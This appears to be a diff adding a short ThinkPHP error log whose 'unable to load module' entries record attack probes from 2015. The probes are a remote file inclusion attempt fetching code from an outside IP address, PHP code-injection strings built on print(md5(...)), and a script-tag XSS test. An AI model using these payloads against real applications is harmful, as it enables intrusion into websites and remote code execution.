@@ -1,0 +1,8 @@
+[ 2015-08-26T00:59:01+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
+[ 2015-08-26T00:59:48+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
+[ 2015-08-26T00:59:56+08:00 ] ERR: (ThinkException) 无法加载模块a_long_name_file_not_exist
+[ 2015-08-26T01:00:35+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}
+[ 2015-08-26T01:00:45+08:00 ] ERR: (ThinkException) 无法加载模块${@print(md5(this_is_a_test_string))}\
+[ 2015-08-26T01:00:55+08:00 ] ERR: (ThinkException) 无法加载模块print(md5(this_is_a_test_string));die();/*
+[ 2015-08-26T01:02:55+08:00 ] ERR: (ThinkException) 无法加载模块'"><scRipt>alert(98733)</sCript>
+[ 2015-08-26T03:48:36+08:00 ] ERR: (ThinkException) 无法加载模块http://120.26.55.211/s.txt
